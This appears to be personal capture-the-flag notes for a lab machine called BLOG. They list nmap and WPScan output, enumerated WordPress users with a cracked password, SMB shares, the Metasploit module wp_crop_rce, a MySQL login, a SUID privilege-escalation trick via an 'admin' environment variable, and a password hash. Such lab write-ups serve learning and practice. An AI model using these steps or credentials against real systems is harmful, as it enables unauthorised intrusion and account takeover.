#ctf
## NMAP
     80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
     |_http-generator: WordPress 5.0
     | http-robots.txt: 1 disallowed entry 
     |_/wp-admin/
     445, 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
     Service Info: Host: BLOG
     Host script results:
     | smb-security-mode: 
     |   account_used: guest
     |   authentication_level: user
     |   challenge_response: supported
     |_  message_signing: disabled (dangerous, but default)
     | smb2-security-mode: 
     |   2.02: 

## WPSCAN
WordPress version 5.0 identified (Insecure, released on 2018-12-06).

[i] User(s) Identified:
[+] Billy Joel -> bjoel
 |  - http://10.10.17.84/wp-json/wp/v2/users/?per_page=100&page=1
[+] Karen Wheeler -> kwheel / cutiepie1
 |  - http://10.10.17.84/wp-json/wp/v2/users/?per_page=100&page=1

## SMB
[+] Dir
    BillySMB -> R/W

[+] Found domain(s):
    BLOG
    WORKGROUP
    
[+] Users
    nobody
    bjoel
    smb

## MSFCONSOLE
use multi/http/wp_crop_rce

## Linux
wordpressuser / LittleYellowLamp90!@ -> mysql

export admin=vini -> /usr/sbin/checker

## MYSQL
bjoel -> $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/
